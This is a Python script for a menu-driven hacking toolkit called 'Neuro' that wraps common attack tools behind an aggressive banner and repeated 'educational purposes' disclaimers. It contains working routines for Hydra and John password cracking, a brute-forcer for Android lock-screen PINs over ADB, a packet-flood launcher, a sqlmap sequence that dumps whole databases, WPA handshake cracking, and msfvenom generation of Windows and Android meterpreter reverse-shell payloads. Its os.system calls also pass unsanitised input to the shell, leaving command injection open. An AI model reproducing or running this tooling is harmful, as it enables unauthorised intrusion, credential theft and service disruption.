import os
import sys
import time
import socket
import threading

os.system("clear")

logo = ("""

                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                          *,                       .*.                          
                       .,.*                         ,.,.                        
                      *. *,                         .*  *                       
                     *.  *.                         .*   *                      
                    .,   ,*       .*********,       ,*   ,,                     
                    ,,    ,* .**,             ,,*  .*    .*                     
                ..  .,      ,***.              ***,      ,,   ,                 
                 ,*  *.       .*               *,   .    *  ,,.                 
                 *,., .*..   ,*                 ,*   .,*, ,,.,                  
                  ,., *,,                        .    ,** .,..                  
                  ,  ,**,  .          , ..         ,  .**,  *                   
                   *,   .*                           .,   ,*                    
                     ., *    ,,,*,   ,   *   .*,,,    * ,,                      
                       .,       ,,,..,   ,,..,,       ,,                        
                         *,  ,,,..   ,   .    .,,,. .*                          
                          .*  ,,*   ..   .,   ,*.  *,                           
                           ,.   ..*, *.  * ,,.,    *                            
                             **  ,,,,..,,..,,*  ,*                              
                               .* .,       .*.,,                                
                                 *., ....  ,.*                                  
                                   *.      *                                    
                                     ,***.                                      
                                                                                
                                                                                
                                                                                
                                                                                

 ________   _______   ___  ___  ________  ________     
|\   ___  \|\  ___ \ |\  \|\  \|\   __  \|\   __  \    
\ \  \\ \  \ \   __/|\ \  \\\  \ \  \|\  \ \  \|\  \   
 \ \  \\ \  \ \  \_|/_\ \  \\\  \ \   _  _\ \  \\\  \  
  \ \  \\ \  \ \  \_|\ \ \  \\\  \ \  \\  \\ \  \\\  \ 
   \ \__\\ \__\ \_______\ \_______\ \__\\ _\\ \_______\
    \|__| \|__|\|_______|\|_______|\|__|\|__|\|_______|
                                                       
                                                                                       

      [ HACK THE WORLD, BE SILENT, DON'T BE AN IDIOT FUCK SOCIETY ]
                             [ VERSION 0.1 ]

                 *** CREATED BY NEURO ***

      1.) Password Attacks
      2.) Website Attacks
      3.) Metasploit Payloads Generator
      4.) Wi-Fi Handshake Cracking
      5.) IP Tracker
      6.) Exit
""")

def neuro():
      os.system("clear")
      print(logo)
      a =input("      Neuro >> ")
      if a =="":
         neuro()
      elif a =="1":
           passwordattacks()
      elif a =="2":
           websiteattacks()
      elif a =="3":
           metasploit()
      elif a =="4":
           wifihandshakecrack()
      elif a =="5":
           iptracing()
      elif a =="6":
           exitmessage()
      else:
          neuro()

def passwordattacks():
      print ("This tool is intended for educational purposes only. Unauthorized use of password crackers on systems or networks without explicit permission is illegal andunethical. Always obtain proper authorization before conducting any security tests. The creator is not responsible for any misuse of this tool.")
      print ("")
      print ("1.) Hydra Cracking")
      print ("2.) ADB Pin Brute Force")
      print ("3.) File Brute Force")
      print ("4.) Main Menu")
      b =input("Neuro >> ")
      if b =="":
         passwordattacks()
      elif b =="1":
           hydracrackoption()
      elif b =="2":
           adbpincrack()
      elif b =="3":
           filecracking()
      elif b =="4":
           neuro()
      else:
          passwordattacks()
def websiteattacks():
      print ("The tools and resources provided on this website are intended solely for educational and research purposes to improve cybersecurity awareness and defenses. Unauthorized use of these tools against any computer systems or networks without proper authorization is illegal and strictly prohibited. Users must obtain explicit permission from the owner of the target system before conducting any security testing.")
      print ("")
      print ("By using the tools and information provided on this website, you agree to comply with all applicable laws and regulations. The website owner and contributors are not responsible for any misuse or damage resulting from the use of these tools. Use these resources responsibly and ethically.")
      print ("1.) Who Is Lookup")
      print ("2.) IP & Port Packet Flood")
      print ("3.) SQLMAP Database Exploit")
      print ("4.) SQLMAP Wizard Attack")
      print ("5.) IP & Port Scanning [NMAP]")
      print ("6.) Main Menu")
      c =input("Neuro >> ")
      if c =="":
         websiteattacks()
      elif c =="1":
           whoislookup()
      elif c =="2":
           flood()
      elif c =="3":
           sqlmapdatabaseexploit()
      elif c =="4":
           sqlmapwizardattack()
      elif c =="5":
           ipportscanning()
      elif c =="6":
           neuro()
      else:
          websiteattacks()
def metasploit():
      print ("The payloads generated using Metasploit are intended solely for educational and ethical testing purposes. Unauthorized use of these payloads on systems without explicit permission from the owner is illegal and can result in severe penalties. The user assumes all responsibility for compliance with all applicable laws. The creators of this code and the Metasploit Framework are not liable for any misuse or damage caused by these payloads.")
      print ("")
      print ("1.) Windows Reverse TCP")
      print ("2.) Android Reverse TCP")
      print ("3.) Main Menu")
      d =input("Neuro >> ")
      if d =="":
         metasploit()
      elif d =="1":
           windowsreversetcp()
      elif d =="2":
           androidreversetcp()
      elif d =="3":
           neuro()
      else:
          metasploit()
def wifihandshakecrack():
      print ("Unauthorized use of this tool to access, compromise, or tamper with networks or systems without explicit permission from the owner is illegal and unethical. The developers of this tool assume no responsibility for any misuse or damage caused by this software. Users are advised to comply with all applicable laws and regulations when using this tool. Always obtain proper authorization before conducting any security testing activities.")
      print ("")
      print ("1.) Crack Handshake Capture File [ NEON ]")
      print ("2.) Analyze PCAP File Using Airodump-ng")
      print ("3.) Crack HCCAPX File [ John The Ripper ]")
      print ("4.) Crack Handshake Capture File [ NORMAL ] ")
      print ("5.) Crack Handshake Without BSSID and ESSID")
      print ("6.) Main Menu")
      e =input("Neuro >> ")
      if e =="":
         wifihandshakecrack()
      elif e =="1":
           crackhandshake()
      elif e =="2":
           analyzepcapfile()
      elif e =="3":
           crackhccapxfile()
      elif e =="4":
           crackhandshakecapfile()
      elif e =="5":
           crackhandshake()
      elif e =="6":
           neuro()
      else:
          wifihandshakecrack()
def iptracing():
      print ("By using this IP tracker tool, you agree to abide by all applicable laws and regulations. This tool is designed for educational and informational purposes only. It is intended to help users understand how IP tracking works and to promote ethical behavior in the realm of cybersecurity.")
      print ("")
      ip =input("[*] Enter IP Target : ")
      iptracker =os.popen(f"curl ipinfo.io/{ip} 2>/dev/null").read().strip()
      print (f"[*] Showing Result For : {ip}")
      print(iptracker)
def exitmessage():
      print ("")
      print ("[*] Thank You For Using Neuro, Please Remember To Come Again")
      exit()

####################################################

def hydracrackoption():
      print ("Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp")
      print ("")
      userlist =input("[*] Enter Userlist : ")
      passlist =input("[*] Enter Wordlist : ")
      target =input("[*] Enter Target URL Or IP : ")
      port =input("[*] Enter Service Port : ")
      service =input("[*] Enter Service Name : ")
      os.system(f"hydra -l {userlist} -P {passlist} {service}://{target}:{port}")
def adbpincrack():
      print ("This Android PIN brute forcing tool is intended solely for educational purposes and ethical hacking practice within legally permissible boundaries. Unauthorized use of this tool on devices you do not own or have explicit permission to test is illegal and unethical.")
      print ("")
      phone_ip=input("Device IP : ")
      port=input("Device Port : " )
      os.system(f"adb connect {phone_ip}:{port}")
      for pin in range(1000,9999):
          pin_str = f"{pin:04d}"
          print(f"Trying PIN: {pin_str}")
          os.system(f"adb shell input text {pin_str}")
          os.system("adb shell input keyevent 66")
def filecracking():
      print ("Unauthorized use of password cracking tools to access or alter data on systems without permission is illegal and unethical. Such actions can result in severe legal consequences, including criminal charges, fines, and imprisonment. Always obtain proper authorization before conducting any security testing or password recovery operations.")
      print ("")
      print ("1.) Crack With Hash [ NO FORMATS ]")
      print ("2.) Crack With File [ WITH FORMATS ]")
      print ("3.) Main Menu")
      crack =input("Neuro >> ")
      if crack =="":
          filecracking()
      elif crack =="1":
            crackhash()
      elif crack =="2":
            crackfile()
      elif crack =="3":
            passwordattacks()
      else:
          filecracking()
def crackhash():
      print ("Unauthorized use of password cracking tools to access or alter data on systems without permission is illegal and unethical. Such actions can result in severe legal consequences, including criminal charges, fines, and imprisonment. Always obtain proper authorization before conducting any security testing or password recovery operations.")
      print ("")
      hash =input("Enter Hash Path : ")
      passlist =input("Enter Password List : ")
      os.system(f"john --wordlist={passlist} {hash}")
def crackfile():
      print ("Unauthorized use of password cracking tools to access or alter data on systems without permission is illegal and unethical. Such actions can result in severe legal consequences, including criminal charges, fines, and imprisonment. Always obtain proper authorization before conducting any security testing or password recovery operations.")
      print ("")
      print ("[*] Available Formats [*]")
      os.system("john --list=formats")
      hash =input("Enter Hash Or File : ")
      passlist =input("Enter Password List : ")
      formats =input("Enter Format Type : ")
      os.system(f"john --format={formats} --wordlist={passlist} {hash}")
def whoislookup():
      print ("A hacker is someone who breaks into computers and networks, and a cracker is someone who breaks into systems with malicious intent.")
      print ("")
      url =input("[*] Enter URL Or IP Address : ")
      os.system(f"whois {url} ")
def flood():
      print ("The following code and information are provided for educational purposes only. Unauthorized use of Distributed Denial of Service (DDoS) attacks, including but not limited to the code provided, is illegal and unethical. Engaging in such activities without explicit permission is a violation of law and can lead to severe legal consequences, including criminal charges and civil penalties")
      print ("")
      print ("This code should only be used in controlled environments or on systems for which you have explicit authorization to perform security testing. Always ensure you have written consent from the owner of the network or system before conducting any tests. The creators of this code do not accept any liability for misuse or damages caused by the use of this code.")
      print ("")
      os.system("python3 modules/flood.py")
def sqlmapdatabaseexploit():
      print ("This tool is intended solely for educational and ethical purposes. It is designed to assist with penetration testing and security research in a responsible manner. Unauthorized use of this tool against systems or networks you do not own or have explicit permission to test is illegal and unethical. By using this tool, you agree to comply with all applicable laws and regulations. The creators and distributors of this tool are not responsible for any misuse or illegal activities conducted with it. Always obtain proper authorization before performing any security testing.")
      print ("")
      url =input("[*] Enter URL Target : ")
      os.system(f"sqlmap -u {url} --dbs")
      database =input("[*] Enter Database Target : ")
      os.system(f"sqlmap -u {url} -D {database} --tables")
      table =input("[*] Enter Target Table : ")
      os.system(f"sqlmap -u {url} -D {database} -T {table} --column")
      column =input("[*] Enter Table Name To Enumarate Database : ")
      os.system(f"sqlmap -u {url} -D {database} -T {table} -C {column} --columns")
      print ("[*] Dumping Database")
      os.system(f"sqlmap -u {url} -D {database} -T {table} -C {column} --dump-all")
      print ("[*] Attack Finished")
def sqlmapwizardattack():
      print ("This tool is intended solely for educational and ethical purposes. It is designed to assist with penetration testing and security research in a responsible manner. Unauthorized use of this tool against systems or networks you do not own or have explicit permission to test is illegal and unethical. By using this tool, you agree to comply with all applicable laws and regulations. The creators and distributors of this tool are not responsible for any misuse or illegal activities conducted with it. Always obtain proper authorization before performing any security testing.")
      os.system("sqlmap --wizard")
def ipportscanning():
      print ("The following activities are intended for educational purposes and authorized testing only. Unauthorized scanning, probing, or accessing of networks and devices is illegal and unethical. Ensure you have explicit permission from the owner of the network or device before conducting any port or IP scanning. The creators and providers of these tools are not responsible for any misuse or illegal activities performed with them. Always adhere to ethical guidelines and legal regulations when performing network security assessments.")
      print ("")
      print ("[?] You Can Use <url> --unprivileged Option If This Error Is Showing route_dst_netlink: if_indextoname(31) failed: 13 (Permission denied)")
      url =input("[*] Enter URL Target : ")
      os.system(f"nmap {url}")
def windowsreversetcp():
      print ("")
      ip =input("[*] Enter LHOST : ")
      port =input("[*] Enter LPORT : ")
      print ("[*] Generating Payload Please Wait....")
      os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={ip} lport={port} -f exe > payload.exe 2>/dev/null")
      print ("[*] Payload Successfully Generated")
def androidreversetcp():
      print ("")
      ip =input("[*] Enter LHOST : ")
      port =input("[*] Enter LPORT : ")
      print ("[*] Generating Payload Please Wait....")
      os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > payload.apk")
      print ("[*] Payload Successfully Generated")
def crackhandshake():
      wordlist=input("[*] Enter Wordlist Path : ")
      handshake=input("[*] Enter Handshake Name : ")
      bssid=input("[*] Enter BSSID : ")
      essid=input("[*] Enter ESSID : ")
      os.system(f"aircrack-ng -w {wordlist} -b {bssid} -e {essid} {handshake}")
def analyzepcapfile():
      pcap =input("[*] Enter PCAP Name : ")
      out =input("[*] Enter Output Name : ")
      os.system(f"airodump-ng -r {pcap} -w {out}")
def crackhccapxfile():
      hash =input("[*] Enter Hash File : ")
      wordlist =input("[*] Enter Wordlist : ")
      os.system(f"john --format=wpapsk --wordlist={wordlist} {hash}")
def crackhandshakecapfile():
      handshake =input("[*] Enter Handshake Name : ")
      wordlist =input("[*] Enter Wordlist Path : ")
      bssid =input("[*] Enter BSSID : ")
      essid =input("[*] Enter ESSID : ")
      os.system(f"aircrack-ng -w {wordlist} -e {essid} -b {bssid} {handshake}")
def crackhandshake():
      handshake =input("[*] Enter Handshake Name : ")
      wordlist =input("[*] Enter Wordlist Path : ")
      os.system(f"aircrack-ng -w {wordlist} {handshake}")
neuro()
